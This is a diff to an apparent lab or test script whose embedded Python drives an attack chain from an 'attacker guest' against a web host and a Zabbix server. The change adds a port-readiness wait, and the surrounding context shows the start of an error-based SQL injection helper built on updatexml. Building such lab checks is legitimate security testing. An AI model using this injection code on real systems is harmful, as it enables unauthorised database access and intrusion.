@@ -12,10 +12,26 @@ python3 - <<'PY'
 # the attacker guest is focal (python 3.8): annotations must stay lazy
 from __future__ import annotations
 
-import hashlib, json, os, re, socket, urllib.parse, urllib.request
+import hashlib, json, os, re, socket, time, urllib.parse, urllib.request
 
 WEB = "http://web"
 ATT = os.environ["IR_ATTACKER_IP"]
+
+# the stack converges after boot (mysqld readiness gates the zabbix server's
+# trapper): wait for the declared surface before driving the chain, so the
+# check is honest about its preconditions wherever it runs
+def wait_port(host: str, port: int) -> None:
+    deadline = time.time() + 240
+    while time.time() < deadline:
+        try:
+            socket.create_connection((host, port), timeout=3).close()
+            return
+        except OSError:
+            time.sleep(5)
+    raise SystemExit(f"{host}:{port} never converged")
+
+wait_port("web", 80)
+wait_port("server", 10051)
 
 def sqli(expr: str) -> str:
     inj = f"updatexml(0,concat(0x7e,({expr})),0)"
